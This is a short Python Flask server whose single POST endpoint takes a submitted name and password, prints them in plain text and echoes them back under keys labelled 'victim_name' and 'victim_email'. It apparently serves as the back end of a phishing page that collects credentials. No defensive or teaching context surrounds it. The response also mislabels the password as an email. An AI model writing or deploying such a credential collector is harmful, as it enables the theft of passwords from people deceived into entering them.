from flask import Flask , request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
@app.route('/submit', methods=['POST'])

def submit():
  data = request.get_json()
  name = data.get('name' , 'No name')
  password = data.get('password' , 'No password')
  print(f'Name: {name}, password: {password}')
  return   jsonify({'victim_name': name, 'victim_email': password})
if __name__ == "__main__":
    app.run(debug=True)